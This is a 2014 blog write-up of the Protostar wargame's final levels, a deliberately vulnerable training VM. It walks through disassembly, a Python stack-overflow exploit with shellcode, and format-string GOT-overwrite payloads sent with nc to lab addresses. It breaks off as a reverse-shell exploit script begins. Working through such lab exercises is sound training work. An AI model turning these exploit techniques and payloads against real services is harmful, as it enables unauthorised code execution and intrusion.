<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta itemprop="name" content="Exploit Exercises - Protostar - Final levels">
  <title>Exploit Exercises - Protostar - Final levels</title>

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta itemprop="description" content="Exploit Exercises&#39; Protostar wargame includes a number of carefully prepared binary exploitation exercises. This is a write up for the final level exploitation.">

  
  <meta itemprop="keywords" content="exploit exercises, protostar, challenge" />
  
    <meta itemprop="wordCount" content="4368">
  

  <meta property="og:title" content="Exploit Exercises - Protostar - Final levels" />
  <meta property="og:description" content="This is my personal blog to keep track of stuff I am doing after hours." />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="http://camelinc.info/blog/2014/11/Exploit-Exercises---Protostar---Final-levels/" />
  

  
  <meta property="og:updated_time" content="2014-11-02 16:55:26 &#43;0000 UTC"/>
  
  
  
  

  
    <meta name="twitter:card" content="summary"/>
  

  
  <meta name="twitter:title" content="Exploit Exercises - Protostar - Final levels"/>
  <meta name="twitter:description" content="This is my personal blog to keep track of stuff I am doing after hours."/>
  
  

  
  
  <link href="http://camelinc.info//css/bootstrap.min.css" rel="stylesheet">
  <link href="http://camelinc.info//css/hc.css" rel="stylesheet">

  
  <link rel="stylesheet" href="http://camelinc.info//css/zenburn.css" type="text/css" media="screen" />

  

  
  <link rel="stylesheet" href="http://camelinc.info//lightbox/css/lightbox.css" type="text/css" media="screen">

  <meta name="generator" content="Hugo 0.37.1" />
  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
  
  
</head>


  <body>

  
<div class="nav-toggle"><i class="fa fa-bars fa-2x"></i> Herring Cove </div>
  <div id = "wrapper">

<div class="navbar navbar-default" role="navigation">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a href="http://camelinc.info//"><p class="navbar-brand">camelinc</p></a>
        </div>

        <div class="navbar-collapse collapse">
          <ul class="nav navbar-nav">
					
          <h2>http://camelinc.info/</h2>
					
					<li><a href="http://camelinc.info/about">About </a></li>
					
					<li><a href="http://camelinc.info/post">Posts </a></li>
					
          </ul>
        </div>
      </div>
    </div>

       
       <div id="sidebar-wrapper">
        <ul class="sidebar-nav">
					<img src="/img/avatar.png" />
          <li class="sidebar-brand"><a href="http://camelinc.info//"><h1 class="brand">camelinc</h1></a><h3>This is my personal blog to keep track of stuff I am doing after hours.</h3></li>
          <hr />

					
						<li><a href="http://camelinc.info/about">About </a></li>
					
						<li><a href="http://camelinc.info/post">Posts </a></li>
					
          <hr />

          <div id="social-wrapper">
           
             <li> <a href="https://twitter.com/camelinc"><i class="fa fa-twitter-square"></i> @twitter</a></li>
           

           
             
           

           
             
           

           
             <li> <a href="https://github.com/camelinc"><i class="fa fa-github-square"></i> github</a> </li>
           
         </div>

       </ul>
     </div>

     <div class="container">


  <div id="article">
    <div class="article-title">Exploit Exercises - Protostar - Final levels</div>
    <p class="meta"><small>&nbsp;<i class="fa fa-calendar-o"></i> 2014-11-02</small></p> <hr/>
    <div class="post">
      

<h1 id="prequisites">Prequisites</h1>

<ul>
<li><a href="http://download.exploit-exercises.com/exploit-exercises-protostar-2.iso">Protostar ISO</a></li>
</ul>

<h1 id="final-0">Final 0</h1>

<p>For this level we have got a binary listening on port 2995.</p>

<h2 id="exploitation">Exploitation</h2>

<p>Let&rsquo;s find out what this binary is up to.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x08049833 &lt;main+0&gt;:    push   %ebp
0x08049834 &lt;main+1&gt;:    mov    %esp,%ebp
0x08049836 &lt;main+3&gt;:    and    $0xfffffff0,%esp
0x08049839 &lt;main+6&gt;:    sub    $0x20,%esp
0x0804983c &lt;main+9&gt;:    movl   $0x0,0x8(%esp)
0x08049844 &lt;main+17&gt;:   movl   $0x0,0x4(%esp)
0x0804984c &lt;main+25&gt;:   movl   $0x8049c74,(%esp)  ; &#34;final0&#34;
0x08049853 &lt;main+32&gt;:   call   0x8048e58 &lt;background_process&gt;
0x08049858 &lt;main+37&gt;:   movl   $0xbb3,(%esp)
0x0804985f &lt;main+44&gt;:   call   0x80492f5 &lt;serve_forever&gt;
0x08049864 &lt;main+49&gt;:   mov    %eax,0x18(%esp)
0x08049868 &lt;main+53&gt;:   mov    0x18(%esp),%eax
0x0804986c &lt;main+57&gt;:   mov    %eax,(%esp)
0x0804986f &lt;main+60&gt;:   call   0x80493d5 &lt;set_io&gt;
0x08049874 &lt;main+65&gt;:   call   0x804975a &lt;get_username&gt;
0x08049879 &lt;main+70&gt;:   mov    %eax,0x1c(%esp)
0x0804987d &lt;main+74&gt;:   mov    $0x8049c7b,%eax    ; &#34;No such user %s\n&#34;
0x08049882 &lt;main+79&gt;:   mov    0x1c(%esp),%edx
0x08049886 &lt;main+83&gt;:   mov    %edx,0x4(%esp)
0x0804988a &lt;main+87&gt;:   mov    %eax,(%esp)
0x0804988d &lt;main+90&gt;:   call   0x8048bac &lt;printf@plt&gt;</code></pre></div>

<p>We have got a service waiting for our commands.
The magic is happening in get_username().</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x0804975e &lt;get_username+4&gt;:    sub    $0x224,%esp
0x08049764 &lt;get_username+10&gt;:   movl   $0x200,0x8(%esp)   ; 512
0x0804976c &lt;get_username+18&gt;:   movl   $0x0,0x4(%esp)     ; 0
0x08049774 &lt;get_username+26&gt;:   lea    -0x210(%ebp),%eax  ; var A
0x0804977a &lt;get_username+32&gt;:   mov    %eax,(%esp)
0x0804977d &lt;get_username+35&gt;:   call   0x8048aec &lt;memset@plt&gt;
0x08049782 &lt;get_username+40&gt;:   lea    -0x210(%ebp),%eax  ;
0x08049788 &lt;get_username+46&gt;:   mov    %eax,(%esp)
0x0804978b &lt;get_username+49&gt;:   call   0x8048aac &lt;gets@plt&gt;</code></pre></div>

<p>So we have got a 512 byte buffer.
The binary reads in some input and stores it in there.
This is a simple stack based buffer overflow.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x08049790 &lt;get_username+54&gt;:   movl   $0xa,0x4(%esp)     ; pass 0x0a
0x08049798 &lt;get_username+62&gt;:   lea    -0x210(%ebp),%eax  ; pass A
0x0804979e &lt;get_username+68&gt;:   mov    %eax,(%esp)
0x080497a1 &lt;get_username+71&gt;:   call   0x8048a9c &lt;strchr@plt&gt;
0x080497a6 &lt;get_username+76&gt;:   mov    %eax,-0x10(%ebp)
0x080497a9 &lt;get_username+79&gt;:   cmpl   $0x0,-0x10(%ebp)   ; compare against null
0x080497ad &lt;get_username+83&gt;:   je     0x80497b5 &lt;get_username+91&gt;
0x080497af &lt;get_username+85&gt;:   mov    -0x10(%ebp),%eax
0x080497b2 &lt;get_username+88&gt;:   movb   $0x0,(%eax)        ; zero out
;...
0x080497b5 &lt;get_username+91&gt;:   movl   $0xd,0x4(%esp)     ; pass 0x0d
0x080497bd &lt;get_username+99&gt;:   lea    -0x210(%ebp),%eax  ; pass A
0x080497c3 &lt;get_username+105&gt;:  mov    %eax,(%esp)
0x080497c6 &lt;get_username+108&gt;:  call   0x8048a9c &lt;strchr@plt&gt;
0x080497cb &lt;get_username+113&gt;:  mov    %eax,-0x10(%ebp)
0x080497ce &lt;get_username+116&gt;:  cmpl   $0x0,-0x10(%ebp)   ; compare against null
0x080497d2 &lt;get_username+120&gt;:  je     0x80497da &lt;get_username+128&gt;
0x080497d4 &lt;get_username+122&gt;:  mov    -0x10(%ebp),%eax
0x080497d7 &lt;get_username+125&gt;:  movb   $0x0,(%eax)        ; zero out</code></pre></div>

<p>This part zeroes out the first 0x0a and 0x0d in the strings.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x080497da &lt;get_username+128&gt;:  movl   $0x0,-0xc(%ebp)    ; setup loop variable
0x080497e1 &lt;get_username+135&gt;:  jmp    0x8049807 &lt;get_username+173&gt;
0x080497e3 &lt;get_username+137&gt;:  mov    -0xc(%ebp),%ebx
0x080497e6 &lt;get_username+140&gt;:  mov    -0xc(%ebp),%eax
0x080497e9 &lt;get_username+143&gt;:  movzbl -0x210(%ebp,%eax,1),%eax
0x080497f1 &lt;get_username+151&gt;:  movsbl %al,%eax
0x080497f4 &lt;get_username+154&gt;:  mov    %eax,(%esp)
0x080497f7 &lt;get_username+157&gt;:  call   0x8048adc &lt;toupper@plt&gt;
0x080497fc &lt;get_username+162&gt;:  mov    %al,-0x210(%ebp,%ebx,1)
0x08049803 &lt;get_username+169&gt;:  addl   $0x1,-0xc(%ebp)
0x08049807 &lt;get_username+173&gt;:  mov    -0xc(%ebp),%ebx    ;
0x0804980a &lt;get_username+176&gt;:  lea    -0x210(%ebp),%eax  ; A
0x08049810 &lt;get_username+182&gt;:  mov    %eax,(%esp)
0x08049813 &lt;get_username+185&gt;:  call   0x8048b8c &lt;strlen@plt&gt;
0x08049818 &lt;get_username+190&gt;:  cmp    %eax,%ebx          ; end of string
0x0804981a &lt;get_username+192&gt;:  jb     0x80497e3 &lt;get_username+137&gt;</code></pre></div>

<p>Next, every character of the string is converted toupper.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x0804981c &lt;get_username+194&gt;:  lea    -0x210(%ebp),%eax
0x08049822 &lt;get_username+200&gt;:  mov    %eax,(%esp)        ; pass A
0x08049825 &lt;get_username+203&gt;:  call   0x8048c7c &lt;strdup@plt&gt;
0x0804982a &lt;get_username+208&gt;:  add    $0x224,%esp
0x08049830 &lt;get_username+214&gt;:  pop    %ebx
0x08049831 &lt;get_username+215&gt;:  pop    %ebp
0x08049832 &lt;get_username+216&gt;:  ret    </code></pre></div>

<p>And finally, the string is copied to the heap.</p>

<h2 id="exploitation-1">Exploitation</h2>

<p>So we create a pattern to identify the offset for the return address.
We also must keep in mind, to terminate the string with 0x0a or 0x0d.
This is to garantee, that our shellcode does not get mangled in the toupper loop.</p>

<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ln"> 1</span><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">socket</span>
<span class="ln"> 2</span><span class="kn">import</span> <span class="nn">struct</span>
<span class="ln"> 3</span>
<span class="ln"> 4</span><span class="n">HOST</span> <span class="o">=</span> <span class="sa"></span><span class="s2">&#34;127.0.0.1&#34;</span>
<span class="ln"> 5</span><span class="n">PORT</span> <span class="o">=</span> <span class="mi">2995</span>
<span class="ln"> 6</span>
<span class="ln"> 7</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="ln"> 8</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
<span class="ln"> 9</span>
<span class="ln">10</span><span class="n">shellcode</span> <span class="o">=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\xe9\x1e\x00\x00\x00</span><span class="s2">&#34;</span> <span class="o">+</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\xb8\x04\x00\x00\x00</span><span class="s2">&#34;</span> <span class="o">+</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\xbb\x01\x00\x00\x00</span><span class="s2">&#34;</span> <span class="o">+</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x59</span><span class="s2">&#34;</span> <span class="o">+</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\xba\x0f\x00\x00\x00</span><span class="s2">&#34;</span> <span class="o">+</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\xcd\x80</span><span class="s2">&#34;</span> <span class="o">+</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\xb8\x01\x00\x00\x00</span><span class="s2">&#34;</span> <span class="o">+</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\xbb\x00\x00\x00\x00</span><span class="s2">&#34;</span> <span class="o">+</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\xcd\x80</span><span class="s2">&#34;</span> <span class="o">+</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\xe8\xdd\xff\xff\xff</span><span class="s2">&#34;</span> <span class="o">+</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21</span><span class="s2">&#34;</span>
<span class="ln">11</span>
<span class="ln">12</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">532</span>
<span class="ln">13</span><span class="n">packet</span> <span class="o">=</span> <span class="sa"></span><span class="s2">&#34;aaa</span><span class="se">\x0d</span><span class="s2">&#34;</span>
<span class="ln">14</span><span class="n">packet</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">shellcode</span>
<span class="ln">15</span><span class="n">packet</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\xCC</span><span class="s2">&#34;</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">packet</span><span class="p">))</span>
<span class="ln">16</span><span class="n">packet</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\x74\xf4\xff\xbf</span><span class="s2">&#34;</span>
<span class="ln">17</span><span class="n">packet</span> <span class="o">+=</span> <span class="sa"></span><span class="s2">&#34;</span><span class="se">\x0a</span><span class="s2">&#34;</span>
<span class="ln">18</span>
<span class="ln">19</span><span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
<span class="ln">20</span>
<span class="ln">21</span><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="ln">22</span><span class="k">print</span> <span class="sa"></span><span class="s2">&#34;</span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">data</span>
<span class="ln">23</span>
<span class="ln">24</span><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>

<h1 id="final-1">Final 1</h1>

<p>For this level we have got a binary listening on port 2994.</p>

<h2 id="exploitation-2">Exploitation</h2>

<p>Let&rsquo;s find out what this binary is up to.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x08049ab9 &lt;main+0&gt;:	push   %ebp
0x08049aba &lt;main+1&gt;:	mov    %esp,%ebp
0x08049abc &lt;main+3&gt;:	and    $0xfffffff0,%esp
0x08049abf &lt;main+6&gt;:	sub    $0x20,%esp
0x08049ac2 &lt;main+9&gt;:	movl   $0x0,0x8(%esp)
0x08049aca &lt;main+17&gt;:	movl   $0x0,0x4(%esp)
0x08049ad2 &lt;main+25&gt;:	movl   $0x8049f5f,(%esp)
0x08049ad9 &lt;main+32&gt;:	call   0x8048f98 &lt;background_process&gt;
0x08049ade &lt;main+37&gt;:	movl   $0xbb2,(%esp)
0x08049ae5 &lt;main+44&gt;:	call   0x8049435 &lt;serve_forever&gt;
0x08049aea &lt;main+49&gt;:	mov    %eax,0x18(%esp)
0x08049aee &lt;main+53&gt;:	mov    0x18(%esp),%eax
0x08049af2 &lt;main+57&gt;:	mov    %eax,(%esp)
0x08049af5 &lt;main+60&gt;:	call   0x8049515 &lt;set_io&gt;
0x08049afa &lt;main+65&gt;:	call   0x8049a31 &lt;getipport&gt;
0x08049aff &lt;main+70&gt;:	call   0x804993d &lt;parser&gt;
...</code></pre></div>

<p>Once again, we have got a service waiting for our commands.
The magic is happening in parser().</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">..
0x08049940 &lt;parser+3&gt;:  	sub    $0x98,%esp
0x08049946 &lt;parser+9&gt;:  	mov    $0x8049f0e,%eax         ; &#34;[final1] $ &#34;
0x0804994b &lt;parser+14&gt;: 	mov    %eax,(%esp)
0x0804994e &lt;parser+17&gt;: 	call   0x8048ccc &lt;printf@plt&gt;
0x08049953 &lt;parser+22&gt;: 	jmp    0x8049a08 &lt;parser+203&gt;  ; start loop
0x08049958 &lt;parser+27&gt;: 	lea    -0x88(%ebp),%eax        ; input buffer
0x0804995e &lt;parser+33&gt;: 	mov    %eax,(%esp)
0x08049961 &lt;parser+36&gt;: 	call   0x80498f1 &lt;trim&gt;
0x08049966 &lt;parser+41&gt;: 	movl   $0x9,0x8(%esp)          ; 9 chars
0x0804996e &lt;parser+49&gt;: 	movl   $0x8049f1a,0x4(%esp)    ; &#34;username &#34;
0x08049976 &lt;parser+57&gt;: 	lea    -0x88(%ebp),%eax        ; input buffer
0x0804997c &lt;parser+63&gt;: 	mov    %eax,(%esp)
0x0804997f &lt;parser+66&gt;: 	call   0x8048d9c &lt;strncmp@plt&gt;
0x08049984 &lt;parser+71&gt;: 	test   %eax,%eax
0x08049986 &lt;parser+73&gt;: 	jne    0x80499a3 &lt;parser+102&gt;
0x08049988 &lt;parser+75&gt;: 	lea    -0x88(%ebp),%eax        ; input buffer
<span class="hl">0x0804998e &lt;parser+81&gt;: 	add    $0x9,%eax               ; string after &#34;username &#34;
</span>0x08049991 &lt;parser+84&gt;: 	mov    %eax,0x4(%esp)
0x08049995 &lt;parser+88&gt;: 	movl   $0x804a220,(%esp)       ; target address
0x0804999c &lt;parser+95&gt;: 	call   0x8048cbc &lt;strcpy@plt&gt;
0x080499a1 &lt;parser+100&gt;:	jmp    0x80499fb &lt;parser+190&gt;  ; continue
0x080499a3 &lt;parser+102&gt;:	movl   $0x6,0x8(%esp)          ; 6 chars
0x080499ab &lt;parser+110&gt;:	movl   $0x8049f24,0x4(%esp)    ; &#34;login &#34;
0x080499b3 &lt;parser+118&gt;:	lea    -0x88(%ebp),%eax        ; input buffer
0x080499b9 &lt;parser+124&gt;:	mov    %eax,(%esp)
0x080499bc &lt;parser+127&gt;:	call   0x8048d9c &lt;strncmp@plt&gt;
0x080499c1 &lt;parser+132&gt;:	test   %eax,%eax
0x080499c3 &lt;parser+134&gt;:	jne    0x80499fb &lt;parser+190&gt;  ; continue
0x080499c5 &lt;parser+136&gt;:	movzbl 0x804a220,%eax          ; username buffer
0x080499cc &lt;parser+143&gt;:	test   %al,%al
<span class="hl">0x080499ce &lt;parser+145&gt;:	jne    0x80499de &lt;parser+161&gt;
</span>0x080499d0 &lt;parser+147&gt;:	movl   $0x8049f2b,(%esp)       ; &#34;invalid protocol&#34;
0x080499d7 &lt;parser+154&gt;:	call   0x8048d4c &lt;puts@plt&gt;
0x080499dc &lt;parser+159&gt;:	jmp    0x80499fb &lt;parser+190&gt;  ; continue
0x080499de &lt;parser+161&gt;:	lea    -0x88(%ebp),%eax        ; input buffer
0x080499e4 &lt;parser+167&gt;:	add    $0x6,%eax               ; string after &#34;login &#34;
0x080499e7 &lt;parser+170&gt;:	mov    %eax,(%esp)
0x080499ea &lt;parser+173&gt;:	call   0x804989a &lt;logit&gt;
0x080499ef &lt;parser+178&gt;:	movl   $0x8049f3c,(%esp)       ; &#34;login failed&#34;
0x080499f6 &lt;parser+185&gt;:	call   0x8048d4c &lt;puts@plt&gt;
0x080499fb &lt;parser+190&gt;:	mov    $0x8049f0e,%eax         ; &#34;[final1] $ &#34;
0x08049a00 &lt;parser+195&gt;:	mov    %eax,(%esp)
0x08049a03 &lt;parser+198&gt;:	call   0x8048ccc &lt;printf@plt&gt;
0x08049a08 &lt;parser+203&gt;:	mov    0x804a1e8,%eax          ; stdin@@GLIBC_2.0
0x08049a0d &lt;parser+208&gt;:	mov    %eax,0x8(%esp)          ;
0x08049a11 &lt;parser+212&gt;:	movl   $0x7f,0x4(%esp)         ; 127
0x08049a19 &lt;parser+220&gt;:	lea    -0x88(%ebp),%eax        ; input buffer
0x08049a1f &lt;parser+226&gt;:	mov    %eax,(%esp)
0x08049a22 &lt;parser+229&gt;:	call   0x8048bdc &lt;fgets@plt&gt;
0x08049a27 &lt;parser+234&gt;:	test   %eax,%eax
0x08049a29 &lt;parser+236&gt;:	jne    0x8049958 &lt;parser+27&gt;
..</code></pre></div>

<p>The heap variable for the username is 0x7F.
This means that 9 bytes are empty, because &ldquo;username &rdquo; is stripped in parser+81.
After storing the username, we can take the jne in parser+145 with &ldquo;login &ldquo;.
The next step is the logit() function.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">...
0x0804989d &lt;logit+3&gt;: 	sub    esp,0x228
0x080498a3 &lt;logit+9&gt;:	  mov    eax,0x8049ee4                   ; format string
0x080498a8 &lt;logit+14&gt;:	mov    edx,DWORD PTR [ebp+0x8]
0x080498ab &lt;logit+17&gt;:	mov    DWORD PTR [esp+0x14],edx        ; login
0x080498af &lt;logit+21&gt;:	mov    DWORD PTR [esp+0x10],0x804a220  ; username
0x080498b7 &lt;logit+29&gt;:	mov    DWORD PTR [esp+0xc],0x804a2a0   ; &#34;host:ip&#34;
0x080498bf &lt;logit+37&gt;:	mov    DWORD PTR [esp+0x8],eax         ; format string
0x080498c3 &lt;logit+41&gt;:	mov    DWORD PTR [esp+0x4],0x200       ; 512 bytes
0x080498cb &lt;logit+49&gt;:	lea    eax,[ebp-0x208]                 ; target buffer
0x080498d1 &lt;logit+55&gt;:	mov    DWORD PTR [esp],eax
0x080498d4 &lt;logit+58&gt;:	call   0x8048dac &lt;snprintf@plt&gt;
0x080498d9 &lt;logit+63&gt;:	lea    eax,[ebp-0x208]
0x080498df &lt;logit+69&gt;:	mov    DWORD PTR [esp+0x4],eax
0x080498e3 &lt;logit+73&gt;:	mov    DWORD PTR [esp],0xf
0x080498ea &lt;logit+80&gt;:	call   0x8048b6c &lt;syslog@plt&gt;
...</code></pre></div>

<p>The snprintf function looks secure.
Other functions like trim() are also not vulnerable.
The only hint we have got would be a format string injection that is passed to syslog() via snprintf().
Lets test that idea.
To do this we provide a format string expression as a username.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">[final1] $ username AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
[final1] $ login test
login failed</code></pre></div>

<p>This produces a syslog entry with memory information that looks like DWORDs.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">Jun 26 06:51:32 (none) final1: Login from 192.168.1.2:60564 as [AAAA8049ee4.804a2a0.804a220.bffffbd6.b7fd7ff4.bffffa28.69676f4c.7266206e.31206d6f.312e3239] with password [test]</code></pre></div>

<p>So we can utilize a format string injection an try to overwrite an address.</p>

<h2 id="exploitation-3">Exploitation</h2>

<p>Now, we need to identify the offset at for the format string.
To do this, we fill the buffer for username, as this is a global variable with a fixed address.
So we can easily reference it.
The format string vector will be placed in the login buffer.</p>

<p>First, let&rsquo;s identify correct offset.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$python -c &#39;print &#34;username &#34;+&#34;A&#34;*117+&#34;\r\nlogin XBBBBCCCCDDDDEEEE&#34;+&#34;.&#34;.join([&#34;%(i)d:%%%(i)d$x&#34; % {&#34;i&#34;:i} for i in range(40,60)])+&#34;\r\n&#34;&#39; | nc 192.168.1.6 2994</code></pre></div>

<p>And the respective syslog entry gives detailed insights</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">^[[AJun 26 10:09:29 (none) final1: Login from 192.168.1.2:33622 as [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA] with password [XBBBBCCCCDDDDEEEE40:41414141.41:41414141.42:41414141.43:41414141.44:205d4141.45:68746977.46:73617020.47:726f7773.48:585b2064.49:42424242.50:43434343.51:%]</code></pre></div>

<p>So the target offset for the format string vulnerability is 49 DWORDs, including one padding byte.
To verify the funtion of the attack we construct the following test.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ python -c &#39;print &#34;username &#34;+&#34;A&#34;*117+&#34;\r\nlogin XBBBBCCCCDDDDEEEE&#34;+&#34;%49$x&#34;+&#34;%50$x&#34;+&#34;%51$x&#34;+&#34;%52$x&#34;+&#34;\r\n&#34;&#39; | nc 192.168.1.6 2994</code></pre></div>

<p>And the syslog output is as expected.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">Jun 26 10:16:12 (none) final1: Login from 192.168.1.2:33677 as [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA] with password [XBBBBCCCCDDDDEEEE42424242434343434444444445454545]</code></pre></div>

<p>In order to gain control over the executable, we could overwrite the syslog() function pointer.
Let&rsquo;s examine the respective instructions.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">gdb$ x/1i 0x080499f6
0x80499f6 &lt;parser+185&gt;:	call   0x8048d4c &lt;puts@plt&gt;
gdb$ x/3i 0x8048d4c
0x8048d4c &lt;puts@plt&gt;:	jmp    DWORD PTR ds:0x804a194
0x8048d52 &lt;puts@plt+6&gt;:	push   0x138
0x8048d57 &lt;puts@plt+11&gt;:	jmp    0x8048acc
gdb$ x/x 0x804a194
0x804a194 &lt;_GLOBAL_OFFSET_TABLE_+168&gt;:	0x08048d52</code></pre></div>

<p>So this leads to the following username string to test the address.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">python -c &#39;print &#34;username &#34;+&#34;A&#34;*117+&#34;\r\nlogin &#34;+&#34;X&#34;*1+&#34;\x94\xa1\x04\x08&#34;+&#34;\x95\xa1\x04\x08&#34;+&#34;\x96\xa1\x04\x08&#34;+&#34;\x97\xa1\x04\x08&#34;+&#34;%49$n&#34;+&#34;%50$n&#34;+&#34;%51$n&#34;+&#34;%52$n&#34;+&#34;\r\n&#34;&#39; | nc 192.168.1.6 2994</code></pre></div>

<p>In the gdb we can verify that the target address is overwritten after the syslog() call.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">gdb$ x/x 0x804a194
0x804a194 &lt;_GLOBAL_OFFSET_TABLE_+168&gt;:	0xb8b8b8b8</code></pre></div>

<p>The next step is to point the address to the global variable &ldquo;username&rdquo; 0x804a220.
This means we need to calculate the following way with a four byte overwrite.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">Byte 1: 0x20 - 0xB8 + 0xff = 0x67 + 0x01 (104)
Byte 2: 0xA2 - 0x20 = 0x82 (130)
Byte 3: 0x04 - 0xA2 + 0xff = 0x61 + 0x01 (98)
Byte 4: 0x08 - 0x04 = 0x04 (4)</code></pre></div>

<p>Unfortunately, writing 0x04 for the last byte results in a 0x0C.
This is a problem, so we need to try a two-byte write.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">Bytes 1+2: 0xA220 - 0x00B0 = 0xA170 (41328)
Bytes 3+4: 0x0804 - 0xA220 + 0xffff = 0x65E3 + 0x01 (26084)</code></pre></div>

<p>So with the following command, we can redirect the execution flow to our buffer.
For testing purposes, the username is filled with 0xCC (int3) instructions to stop execution when the code is hit in gdb.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ python -c &#39;print &#34;username &#34;+&#34;\xCC&#34;*117+&#34;\r\nlogin &#34;+&#34;X&#34;*1+&#34;\x94\xa1\x04\x08&#34;+&#34;\x96\xa1\x04\x08&#34;+&#34;%41328x%49$n&#34;+&#34;%26084x%50$n&#34;+&#34;\r\n&#34;&#39; | nc 192.168.1.6 2994</code></pre></div>

<p>in the end the binary behaves as expected.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">Program received signal SIGTRAP, Trace/breakpoint trap.
--------------------------------------------------------------------------[regs]
  EAX: 0x00000000  EBX: 0xB7FD7FF4  ECX: 0x00011000  EDX: 0xB7FD7FF4  o d I t S z A p c
  ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFFB48  ESP: 0xBFFFFAAC  EIP: 0x0804A221
  CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
--------------------------------------------------------------------------[code]
0x804a221 &lt;username+1&gt;:	int3   
0x804a222 &lt;username+2&gt;:	int3   
0x804a223 &lt;username+3&gt;:	int3   
0x804a224 &lt;username+4&gt;:	int3   
0x804a225 &lt;username+5&gt;:	int3   
0x804a226 &lt;username+6&gt;:	int3   
0x804a227 &lt;username+7&gt;:	int3   
0x804a228 &lt;username+8&gt;:	int3   
--------------------------------------------------------------------------------
0x0804a221 in username ()</code></pre></div>

<p>Now we need to find a proper shellcode.
with msfvenom we can easily create an appropriate reverese tcp shell.
The final exploit looks as follows.</p>

<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ln"> 1</span><span class="ch">#!/usr/bin/python</span>
<span class="ln"> 2</span><span class="c1"># -*- coding: utf-8 -*-</span>
<span class="ln"> 3</span>
<span class="ln"> 4</span><span class="kn">import</span> <span class="nn">socket</span>
<span class="ln"> 5</span><span class="kn">import</span> <span class="nn">struct</span>
<span class="ln"> 6</span><span class="kn">import</span> <span class="nn">sys</span>
<span class="ln"> 7</span>
<span class="ln"> 8</span><span class="c1">#TARGET</span>
